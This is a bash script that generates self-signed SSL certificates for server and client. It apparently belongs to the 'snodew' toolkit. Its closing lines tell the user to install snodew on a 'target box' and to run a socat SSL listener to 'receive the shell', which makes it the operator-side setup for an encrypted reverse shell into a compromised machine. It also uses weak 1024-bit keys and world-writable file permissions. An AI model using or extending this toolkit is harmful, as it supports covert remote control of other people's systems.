#!/bin/bash

echo "about to generate your cert. you should be doing"
echo "this part on your own box. blank information will"
echo "be entered automatically as to select the default"
echo "values for input; if there are any."
sleep 1; echo

gen_cert(){
    openssl genrsa -out $1.key 1024 &>/dev/null
    printf '\n\n\n\n\n\n\n' | openssl req -new -key $1.key -x509 -days 3653 -out $1.crt &>/dev/null
    cat $1.key $1.crt >$1.pem && rm $1.key
    chmod 666 $1.crt $1.pem
}
echo -n "doing server... "
gen_cert server
printf "client...\n"
gen_cert client

echo "done. now you can install snodew on the target box."
echo "and use ./listen_socatssl.sh to receive the shell."